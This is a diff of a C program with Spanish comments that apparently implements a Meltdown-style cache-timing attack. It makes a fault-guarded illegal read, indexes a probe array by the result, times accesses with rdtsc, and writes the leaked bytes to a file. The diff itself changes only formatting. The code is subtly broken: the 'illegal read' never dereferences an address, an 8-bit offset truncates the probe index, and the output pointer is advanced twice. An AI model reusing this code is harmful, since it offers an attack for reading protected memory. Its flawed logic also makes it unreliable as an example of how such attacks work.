@@ -48,7 +48,7 @@ void ataque(int address, int nBytsLeer, uint8_t *resultado)
 
 		if (!setjmp(buf))
 		{												 // para poder volver despues del segfault
-			int value = address;					 // lectura ilegal
+			int value = address;						 // lectura ilegal
 			uint8_t offset = value * 4096;				 // valor * 4096
 			volatile uint8_t temp = probe_array[offset]; // acceso basandonos en esa lectura
 		}
@@ -60,16 +60,16 @@ void ataque(int address, int nBytsLeer, uint8_t *resultado)
 			int t1 = _rdtsc();				   // tomar primera medida de tiempo
 			int dummy = probe_array[i * 4096]; // acceso
 			int t2 = _rdtsc() - t1;			   // segunda medida de tiempo
-			if (t2 > max)					// si es que mas ha tardado, sustitulle al maximo
+			if (t2 > max)					   // si es que mas ha tardado, sustitulle al maximo
 			{
 				max = t2;
 				finalI = i;
 			}
 		}
 		printf("iteracion:%i, valor escrito%i\n", j, finalI);
-		auxi[j] = finalI;//guardamos el valor que mas haya tardado
+		auxi[j] = finalI; // guardamos el valor que mas haya tardado
 		auxi++;
-		address++;//actualizamos la posicion a leer la siguiente direccion
+		address++; // actualizamos la posicion a leer la siguiente direccion
 	}
 }
 
@@ -82,7 +82,7 @@ int main(int argc, char *argv[])
 	}
 
 	const char *nombre_archivo = argv[1];
-	//abrimos el archibo:
+	// abrimos el archibo:
 	FILE *archivo = fopen(nombre_archivo, "w");
 	if (!archivo)
 	{
@@ -92,15 +92,13 @@ int main(int argc, char *argv[])
 	uint8_t resultado[1024];
 	ataque(0, 1024, resultado);
 
-	//escribimos el resultado
-	for (int i = 0; i < 1024-1; i++)
+	// escribimos el resultado
+	for (int i = 0; i < 1024 - 1; i++)
 	{
 		fprintf(archivo, "%c", resultado[i]);
 	}
-	
 
-
-	//cerramos el archivo
+	// cerramos el archivo
 	fclose(archivo);
 	printf("Resultado escrito en '%s'\n", nombre_archivo);
 	return 0;
